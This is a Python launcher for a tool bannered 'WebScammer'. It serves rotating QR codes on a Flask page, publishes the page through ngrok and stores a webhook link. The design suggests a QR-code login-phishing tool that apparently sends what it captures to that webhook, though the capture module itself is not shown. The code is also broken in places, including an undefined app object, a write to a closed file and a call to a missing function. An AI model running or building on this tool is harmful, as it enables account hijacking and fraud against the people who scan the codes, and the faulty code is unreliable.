import module_qrcode as qr
from flask import Flask, render_template, redirect, url_for, render_template
from colorama import Fore, init
from PIL import Image
import pathlib
import os
import time
import json
import json
from threading import Thread
from pyngrok import ngrok
import chromedriver_binary
import requests


def verif_webhook(link): return requests.get(link).reason == "OK"


init()


def mainfunc():
    banner = r'''
$$\      $$\           $$\        $$$$$$\
$$ | $\  $$ |          $$ |      $$  __$$\
$$ |$$$\ $$ | $$$$$$\  $$$$$$$\  $$ /  \__| $$$$$$$\ $$$$$$\  $$$$$$\$$$$\  $$$$$$\$$$$\   $$$$$$\   $$$$$$\
$$ $$ $$\$$ |$$  __$$\ $$  __$$\ \$$$$$$\  $$  _____|\____$$\ $$  _$$  _$$\ $$  _$$  _$$\ $$  __$$\ $$  __$$\
$$$$  _$$$$ |$$$$$$$$ |$$ |  $$ | \____$$\ $$ /      $$$$$$$ |$$ /-$$ / $$ |$$ / $$ / $$ |$$$$$$$$ |$$ |  \__|
$$$  / \$$$ |$$   ____|$$ |  $$ |$$\   $$ |$$ |     $$  __$$ |$$ | $$ | $$ |$$ | $$ | $$ |$$   ____|$$ |
$$  /   \$$ |\$$$$$$$\ $$$$$$$  |\$$$$$$  |\$$$$$$$\\$$$$$$$ |$$ | $$ | $$ |$$ | $$ | $$ |\$$$$$$$\ $$ |
\__/	 \__| \_______|\_______/  \______/  \_______|\_______|\__| \__| \__|\__| \__| \__| \_______|\__|

'''
    banner = banner.replace("$", f"{Fore.WHITE}$")
    colored_char = ["|", "\\", "_", "/"]
    for colored in colored_char:
        banner = banner.replace(colored, f"{Fore.LIGHTRED_EX}"+colored)
    print(banner)
    print('(1) Start the server in localhost:5000 \n(2) Start the server with ngrok (auth required)\n')
    input_mode = input('>>> ')
    try:
        input_mode = int(input_mode)
    except:
        main()
    if input_mode == 1:
        fichier = os.path.join('static', 'image')
        app = Flask(__name__)

        @app.route("/")
        def main():
            Thread(target=qr.genqr).start()
            time.sleep(5)
            initial_count = -1
            for path in pathlib.Path(fichier).iterdir():
                if path.is_file():
                    initial_count += 1
            return render_template("index.html", qrcode=f"{fichier}/qr{initial_count}.png")

        @app.route('/image/<filename>')
        def display_image(filename):
            return redirect(url_for(filename='image/' + filename))
        app.run()
        print('Server successfully started on http://localhost:5000')

    if input_mode == 2:
        try:
            os.system("taskkill /f /im ngrok.exe")
            os.system("cls")
        except:
            os.system("cls")
        with open('config.json') as f:
            config = json.load(f)
            f.close()
        if not config.get('webhook').startswith("https"):
            with open('config.json', 'w') as f:
                link = input("Enter the webhook link : ")
                while not verif_webhook(link):
                    link = input("Enter the webhook link : ")
                webhook = {
                    "webhook": "",
                }
                webhook['webhook'] = link
                json.dump(webhook, f)
        if config.get('ok') == 'no':
            print(
                f"{Fore.CYAN}A web page will be open please create a account [PRESS ENTER TO CONTINUE]")
            input()
            print("[PRESS ENTER TO CONTINUE]")
            os.system('start https://dashboard.ngrok.com/signup')
            input()
            os.system('cls')
            print(
                f"{Fore.CYAN}A web page will be open please copy your authtoken [PRESS ENTER TO CONTINUE]")
            input()
            os.system(
                "start https://dashboard.ngrok.com/get-started/your-authtoken")
            print(f"[PRESS ENTER TO CONTINUE]{Fore.RESET}")
            input()
            os.system('cls')
            ngrok.set_auth_token(input("Enter your authtoken"))
            app.run()
            print(f"{Fore.CYAN}Your server link is {Fore.RESET}" +
                  ngrok.connect(5000))
            webhook = {
                "webhook": "",
                "ok": "yes"
            }
            webhook['webhook'] = link
            json.dump(webhook, f)
        print(f"{Fore.CYAN}Your server link is {ngrok.connect(5000)}")
        app.run()

    else:
        mainfunc()


if __name__ == '__main__':
    mainfunc()


